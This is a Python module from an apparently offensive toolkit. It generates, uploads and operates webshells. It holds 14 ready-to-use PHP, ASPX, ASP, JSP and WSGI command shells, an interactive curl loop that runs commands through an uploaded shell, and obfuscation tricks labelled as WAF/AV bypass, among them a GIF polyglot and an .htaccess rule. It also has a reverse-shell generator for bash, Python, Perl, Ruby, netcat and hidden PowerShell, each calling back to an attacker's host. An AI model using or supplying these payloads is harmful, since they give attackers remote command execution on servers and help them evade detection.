"""
modules/webshells.py
tmrswrr - Webshell Generation, Upload & Interaction
PHP/ASPX/JSP shells, obfuscation, one-liners 
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_RED,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


SHELLS = {
    # PHP shells
    "php_simple": (
        "<?php system($_GET['cmd']); ?>",
        "php", "PHP simple system()"
    ),
    "php_passthru": (
        "<?php passthru($_GET['cmd']); ?>",
        "php", "PHP passthru()"
    ),
    "php_exec": (
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "php", "PHP shell_exec()"
    ),
    "php_popen": (
        "<?php $h=popen($_GET['cmd'],'r');while(!feof($h)){echo fgets($h);}pclose($h); ?>",
        "php", "PHP popen()"
    ),
    "php_proc": (
        "<?php $d=proc_open($_GET['c'],array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p);echo stream_get_contents($p[1]);proc_close($d); ?>",
        "php", "PHP proc_open()"
    ),
    "php_obfuscated": (
        "<?php $f=base64_decode('c3lzdGVt');$f($_GET['cmd']); ?>",
        "php", "PHP obfuscated (base64 system)"
    ),
    "php_preg": (
        "<?php preg_replace('/.*/e',base64_decode($_GET['c']),''); ?>",
        "php", "PHP preg_replace /e (PHP<7)"
    ),
    "php_assert": (
        "<?php assert($_GET['cmd']); ?>",
        "php", "PHP assert() eval"
    ),
    # ASPX shells
    "aspx_simple": (
        '<%@ Page Language="C#" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>',
        "aspx", "ASPX C# system()"
    ),
    "asp_simple": (
        '<% Set oSh=Server.CreateObject("WScript.Shell"):cmd=Request("cmd"):Set oEx=oSh.Exec(cmd):Response.Write oEx.StdOut.ReadAll %>',
        "asp", "Classic ASP WScript.Shell"
    ),
    # JSP shells
    "jsp_simple": (
        '<%@ page import="java.io.*" %><% String cmd=request.getParameter("cmd");Process p=Runtime.getRuntime().exec(cmd);BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.print(line+"<br>");} %>',
        "jsp", "JSP Runtime.exec()"
    ),
    # Python WSGI
    "py_wsgi": (
        "import os\ndef application(environ,start_response):\n    cmd=environ.get('QUERY_STRING','').replace('cmd=','')\n    start_response('200 OK',[('Content-Type','text/plain')])\n    return [os.popen(cmd).read().encode()]",
        "py", "Python WSGI app"
    ),
    # Minimal one-liners
    "php_oneliner": (
        "<?=`$_GET[c]`?>",
        "php", "PHP one-liner (backtick)"
    ),
    "php_gzip": (
        "<?php eval(gzinflate(base64_decode('PAYLOAD'))); ?>",
        "php", "PHP gzip+base64 obfuscated"
    ),
}


def generate_shell():
    section("WEBSHELL GENERATOR")
    print(f"\n  {NEON_CYN}Available webshell types:{RST}\n")
    shell_list = list(SHELLS.items())
    for i, (key, (code, ext, desc)) in enumerate(shell_list, 1):
        print(f"  {NEON_GRN}[{i:>2}]{RST}  {PURE_WHITE}{desc:<40}{RST}  {DIM}.{ext}{RST}")

    print(f"\n  {NEON_CYN}[A]{RST}  Generate ALL shells")
    c = prompt("Choice")

    if c.upper() == "A":
        selected = shell_list
    else:
        try:
            idx = int(c) - 1
            selected = [shell_list[idx]]
        except (ValueError, IndexError):
            warn("Invalid choice")
            return

    for key, (code, ext, desc) in selected:
        out_file = _out(f"shell_{key}.{ext}")
        with open(out_file, "w") as f:
            f.write(code)
        success(f"[{ext.upper()}] {desc}")
        print(f"  {DIM}→ {out_file}{RST}")
        print(f"  {NEON_CYN}Code: {code[:80]}...{RST}" if len(code) > 80 else f"  {NEON_CYN}Code: {code}{RST}")
        print()

    info(f"Shell files saved to: {OUTPUT_DIR}")
    info("Upload via: file_upload_advanced [31] or direct curl -F")


def shell_interaction():
    section("WEBSHELL INTERACTION")
    shell_url = prompt("Webshell URL (e.g. http://target.com/uploads/shell.php)")
    if not shell_url:
        return

    cmd_param = prompt("Command parameter name [cmd]") or "cmd"
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    info(f"Shell: {shell_url}?{cmd_param}=COMMAND")
    info("Type commands. 'exit' or '0' to return.")
    print()

    while True:
        try:
            cmd = input(f"  {NEON_RED}shell@target{RST}{NEON_GRN}${RST} ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if cmd in ("exit", "quit", "0", "q"):
            break
        if not cmd:
            continue

        import urllib.parse
        enc = urllib.parse.quote(cmd)
        out, _, _ = run_cmd(
            f'curl -sk {cookie_flag} "{shell_url}?{cmd_param}={enc}" -m 15'
        )
        # Clean up HTML tags
        clean = re.sub(r'<[^>]+>', '', out).strip()
        print(f"{PURE_WHITE}{clean}{RST}" if clean else f"  {DIM}(no output){RST}")


def obfuscated_shells():
    section("OBFUSCATED WEBSHELL TECHNIQUES")
    print(f"""
  {NEON_CYN}PHP Obfuscation Techniques (WAF/AV bypass):{RST}

  {NEON_GRN}[1] Base64 encoded function name:{RST}
    <?php $f=base64_decode('c3lzdGVt'); $f($_GET['cmd']); ?>
    # base64('system') = 'c3lzdGVt'

  {NEON_GRN}[2] Variable function call:{RST}
    <?php $a='sys'.'tem'; $a($_GET['cmd']); ?>

  {NEON_GRN}[3] String concatenation:{RST}
    <?php ('s'.'y'.'s'.'t'.'e'.'m')($_GET['c']); ?>

  {NEON_GRN}[4] Hex-encoded function:{RST}
    <?php \\x73\\x79\\x73\\x74\\x65\\x6d($_GET['c']); ?>

  {NEON_GRN}[5] ROT13 + str_rot13:{RST}
    <?php str_rot13('flfgrz')($_GET['c']); ?>
    # str_rot13('system') = 'flfgrz'

  {NEON_GRN}[6] Double base64 + gzip:{RST}
    <?php eval(gzinflate(base64_decode('...')));?>
    # Encode: php -r "echo base64_encode(gzdeflate('<?php system(\\$_GET[c]); ?>'));"

  {NEON_GRN}[7] Image polyglot shell (bypass content-type check):{RST}
    Create GIF header + PHP:
    echo -e 'GIF89a<?php system(\\$_GET[c]); ?>' > shell.gif

  {NEON_GRN}[8] .htaccess to treat .jpg as PHP:{RST}
    AddType application/x-httpd-php .jpg
    Upload this as .htaccess, then upload shell.jpg
""")

    choice = prompt("Generate obfuscated shell? [1-8]")
    shells_map = {
        "1": ("<?php $f=base64_decode('c3lzdGVt'); $f($_GET['cmd']); ?>", "php", "base64_system"),
        "2": ("<?php $a='sys'.'tem'; $a($_GET['cmd']); ?>", "php", "concat"),
        "3": ("<?php ('s'.'y'.'s'.'t'.'e'.'m')($_GET['c']); ?>", "php", "direct_concat"),
        "4": (r"<?php \x73\x79\x73\x74\x65\x6d($_GET['c']); ?>", "php", "hex"),
        "5": ("<?php str_rot13('flfgrz')($_GET['c']); ?>", "php", "rot13"),
        "7": ("GIF89a<?php system($_GET['c']); ?>", "gif.php", "polyglot_gif"),
        "8": ("AddType application/x-httpd-php .jpg", "htaccess", "htaccess_jpg"),
    }
    if choice in shells_map:
        code, ext, name = shells_map[choice]
        out_file = _out(f"obfus_shell_{name}.{ext}")
        if choice == "7":
            with open(out_file, "wb") as f:
                f.write(b"GIF89a" + b"<?php system($_GET['c']); ?>")
        else:
            with open(out_file, "w") as f:
                f.write(code)
        success(f"Obfuscated shell → {out_file}")
        print(f"  {NEON_GRN}{code}{RST}")
    elif choice == "6":
        import subprocess
        result = subprocess.run(
            ['php', '-r', "echo base64_encode(gzdeflate('<?php system($_GET[c]); ?>'));"],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            payload = result.stdout.strip()
            code = f"<?php eval(gzinflate(base64_decode('{payload}'))); ?>"
            out_file = _out("obfus_shell_gzip.php")
            with open(out_file, "w") as f:
                f.write(code)
            success(f"Gzip+base64 shell → {out_file}")


def reverse_shell_gen():
    section("REVERSE SHELL GENERATOR")
    lhost = prompt("Your IP (LHOST)") or SESSION.get("attacker_ip", "")
    lport = prompt("Your port (LPORT) [4444]") or "4444"

    if not lhost:
        warn("LHOST required")
        return

    shells = {
        "Bash":         f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Bash UDP":     f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "Python":       f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Python2":      f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call([\"/bin/sh\"])'",
        "PHP":          f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl":         f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "Ruby":         f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "NC (mkfifo)":  f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "NC (-e)":      f"nc -e /bin/sh {lhost} {lport}",
        "PowerShell":   f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "PHP (web)":    f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
    }

    print()
    for lang, payload in shells.items():
        print(f"  {NEON_CYN}{lang}:{RST}")
        print(f"  {PURE_WHITE}{payload}{RST}")
        print()

    print(f"  {NEON_GRN}Listener:{RST}  nc -nlvp {lport}")
    print(f"  {NEON_GRN}Upgrade:{RST}   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")

    out_file = _out(f"revshells_{lhost}_{lport}.txt")
    with open(out_file, "w") as f:
        for lang, payload in shells.items():
            f.write(f"# {lang}\n{payload}\n\n")
    success(f"All reverse shells saved → {out_file}")


def run():
    print_banner("WEBSHELLS", "tmrswrr - Generate · Upload · Interact · Obfuscate · Reverse Shell")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Generate Webshells     {SOFT_WHITE}(PHP/ASPX/JSP/ASP - 14 variants){RST}
  {NEON_CYN}[2]{RST} Shell Interaction       {SOFT_WHITE}(interactive command execution){RST}
  {NEON_CYN}[3]{RST} Obfuscated Shells       {SOFT_WHITE}(WAF/AV bypass - base64, hex, gzip){RST}
  {NEON_CYN}[4]{RST} Reverse Shell Generator {SOFT_WHITE}(bash/python/php/nc/powershell){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": generate_shell()
        elif c == "2": shell_interaction()
        elif c == "3": obfuscated_shells()
        elif c == "4": reverse_shell_gen()
        save_session()
